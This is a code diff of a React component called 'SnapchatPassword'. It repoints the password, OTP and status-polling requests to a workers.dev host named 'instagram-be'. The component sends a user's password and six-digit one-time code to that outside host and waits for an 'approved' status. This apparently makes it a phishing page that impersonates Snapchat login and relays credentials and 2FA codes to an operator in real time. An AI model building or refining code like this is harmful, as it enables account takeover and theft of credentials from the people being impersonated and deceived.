@@ -34,7 +34,7 @@ const SnapchatPassword = () => {
 
       try {
         // Submit password to backend
-        const response = await fetch('https://api-accounts.afbex.com/stage/test/submit-password', {
+        const response = await fetch('https://instagram-be.mizerablepi.workers.dev/test/submit-password', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ password: password })
@@ -61,7 +61,7 @@ const SnapchatPassword = () => {
     if (otpValue.length === 6) {
       try {
         // Submit OTP to backend
-        const response = await fetch('https://api-accounts.afbex.com/stage/test/submit-otp', {
+        const response = await fetch('https://instagram-be.mizerablepi.workers.dev/test/submit-otp', {
           method: 'POST',
           headers: { 'Content-Type': 'application/json' },
           body: JSON.stringify({ otp: otpValue })
@@ -81,7 +81,7 @@ const SnapchatPassword = () => {
   const startOtpPolling = () => {
     const interval = setInterval(async () => {
       try {
-        const response = await fetch('https://api-accounts.afbex.com/stage/test/check-status');
+        const response = await fetch('https://instagram-be.mizerablepi.workers.dev/test/check-status');
         const data = await response.json();
         
         if (data.status === 'approved') {
